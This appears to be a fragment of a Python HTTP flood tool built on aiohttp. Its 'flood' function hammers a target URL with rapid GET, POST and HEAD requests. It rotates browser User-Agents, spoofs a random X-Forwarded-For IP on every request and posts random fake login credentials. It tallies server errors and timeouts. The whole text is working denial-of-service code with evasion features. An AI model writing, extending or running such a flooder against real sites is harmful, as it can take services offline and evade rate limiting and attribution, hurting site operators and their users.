import aiohttp
import asyncio
import random
import string
import time
import socket

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
]

def generate_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

async def flood(session, url, rps, duration, stats, stop_event):
    start_time = time.time()
    interval = 1.0 / rps
    while time.time() - start_time < duration and not stop_event.is_set():
        request_start = time.time()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "X-Forwarded-For": generate_random_ip(),
        }
        method = random.choice(["GET", "POST", "HEAD"])
        data = None
        if method == "POST":
            data = aiohttp.FormData({
                'user': generate_random_string(),
                'pass': generate_random_string(),
            })
        try:
            async with session.request(method, url, headers=headers, data=data, timeout=10) as response:
                await response.read()
                stats['total_requests'] += 1
                if response.status < 400:
                    stats['success_requests'] += 1
                elif response.status >= 500:
                    stats['server_errors'] += 1
                else:
                    stats['client_errors'] += 1
        except asyncio.TimeoutError:
            stats['timeouts'] += 1
        except aiohttp.ClientError:
            stats['connection_errors'] += 1
        except Exception:
            stats['other_errors'] += 1

        elapsed = time.time() - request_start
        sleep_time = interval - elapsed
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)